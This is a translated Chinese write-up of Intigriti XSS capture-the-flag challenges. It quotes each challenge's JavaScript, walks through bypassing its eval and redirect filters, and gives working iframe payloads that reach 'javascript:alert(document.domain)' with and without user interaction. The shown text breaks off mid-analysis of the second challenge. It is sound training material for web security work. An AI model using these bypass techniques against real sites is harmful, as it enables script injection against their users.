# Intigriti XSS 系列挑战 Writeups
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x01 xss challenge 1220
###  题目概述
地址： ，挑战有以下要求：
  * 使用最新版的Firefox或者Chrome浏览器
  * 执行JS：`alert(document.domian)`
  * 在域名`challenge-1220.intigriti.io`下被执行
  * 不允许self-XSS 和 MiTM 攻击
###  思路分析
可以看到页面上有一个计算器，尝试进行一些简单的操作，能发现url中会加入一些参数：
    https://challenge-1220.intigriti.io/?num1=6&operator=%2B&num2=6
检查页面源码，查看JS文件`script.js`:
    window.name = "Intigriti's XSS challenge";
    const operators = ["+", "-", "/", "*", "="];
    function calc(num1 = "", num2 = "", operator = ""){
      operator = decodeURIComponent(operator);
      var operation = `${num1}${operator}${num2}`;
      document.getElementById("operation").value = operation;
      if(operators.indexOf(operator) == -1){
        throw "Invalid operator.";
      }
      if(!(/^[0-9a-zA-Z-]+$/.test(num1)) || !(/^[0-9a-zA-Z]+$/.test(num2))){
        throw "No special characters."
      }
      if(operation.length > 20){
        throw "Operation too long.";
      }
      return eval(operation);
    }
    function init(){
      try{
        document.getElementById("result").value = calc(getQueryVariable("num1"), getQueryVariable("num2"), getQueryVariable("operator"));
      }
      catch(ex){
        console.log(ex);
      }
    }
    function getQueryVariable(variable) {
        window.searchQueryString = window.location.href.substr(window.location.href.indexOf("?") + 1, window.location.href.length);
        var vars = searchQueryString.split('&');
        var value;
        for (var i = 0; i 
    # javascritp
    setTimeout(secondchange, 1000);
    function secondchange() {
        document.querySelector("#intigriti").src = "https://challenge-1220.intigriti.io/?javascript:alert(document.domain)//#&num1=location&operator=%3D&num2=a";
    }
点击计算器`C`键，调用`clear() ==> init()`，实现第二次执行，成功实现xss:
####  b.无交互
为了实现无需用户交互下的xss，可用构造`onhashchange="init"` 事件，每当hash变化后就调用`init`:
    # html
    # javascritp
    setTimeout(firstchange, 1000);
    setTimeout(secondchange, 2000);
    function firstchange() {
      document.querySelector("#intigriti").src = "https://challenge-1220.intigriti.io/?javascript:alert(document.domain)//#&num1=a&operator=%3D&num2=searchQueryString";
    }
    function secondchange() {
        document.querySelector("#intigriti").src = "https://challenge-1220.intigriti.io/?javascript:alert(document.domain)//#&num1=location&operator=%3D&num2=a";
    }
## 0x02 xss challenge 0121
###  题目概述
地址： ，挑战有以下要求：
  * 使用最新版的Firefox或者Chrome浏览器
  * 通过`alert()`弹出 {THIS_IS_THE_FLAG}
  * 利用此页面的xss漏洞
  * 不允许self-XSS 和 MiTM 攻击
###  思路分析
查看网页JS代码：
      window.href = new URL(window.location.href);
      window.r = href.searchParams.get("r");
      //Remove malicious values from href, redirect, referrer, name, ...
      ["document", "window"].forEach(function(interface){
        Object.keys(window[interface]).forEach(function(globalVariable){
            if((typeof window[interface][globalVariable] == "string") && (window[interface][globalVariable].indexOf("javascript") > -1)){
                delete window[interface][globalVariable];
            }
        });
      });
      window.onload = function(){
        var links = document.getElementsByTagName("a");
        for(var i = 0; i "' ]/)){
          window.setTimeout(function(){
              if(url.startsWith("https://")){
                window.location = url;
              }
              else{ //local redirect
                window.location = window.origin + "/" + url;
              }
              window.setTimeout(function(){
                document.getElementById("error").style.display = "block";
              }, 1000);
          }, 5000);
          document.getElementById("popover").innerHTML = `
            You're being redirected to ${url} in 5 seconds...
              If you're not being redirected, click here
            .`;
        }
        else{
          alert("Invalid URL.");
        }
      }
首先定义了一个搜索参数`r`：`window.r = href.searchParams.get（"r"）;`，然后对`document`
`window`的所有属性进行循环检查并加限制，如果属性为字符串且包含`javastript`，则被删除:
最后可以看到一个可疑的`safeRedirect()`函数，当`r`未定义就会被传入到这个函数中。并且对参数`url`进行了限制，不允许包含``
`"` `'` `(空格)`
，如果`url`以`https://`开头，`window.location`设为该URL；如果不是，则将`window.location`
设为`window.origin + "/" + url`。此外，通过`error`的重定向，可以将`here`嵌入到网页中。
综上分析，目前有几个点需要突破：
  * `javastript` 不能出现在`r`参数中；
  * `` `"` `'` `(空格)` 不能出现在`r`参数中；
  * 通过error信息嵌入html标签；
  * 由于`window.origin` 为`https://challenge-0121.intigriti.io` 所以url总以`https://`开头，则不能被控制；
首先尝试进行一个简单的重定向尝试，输出入`https://challenge-0121.intigriti.io/?r=aaaaaa`被重定向到
`https://challenge-0121.intigriti.io/aaaaaa` 且嵌入了标签：
当将`%0a`插入到`r`的值中，如`r=aaa%0aaaa=bbb`时，嵌入的标签就可以被控制：
为了能使`window.location` 被设为`window.origin + "/" +
url`，则需要`window.orgin`不以`https://`开头，但该默认网页的`window.orgin`无法更改（总是`https://challenge-0121.intigriti.io`），所以这里需要换一种思路思考。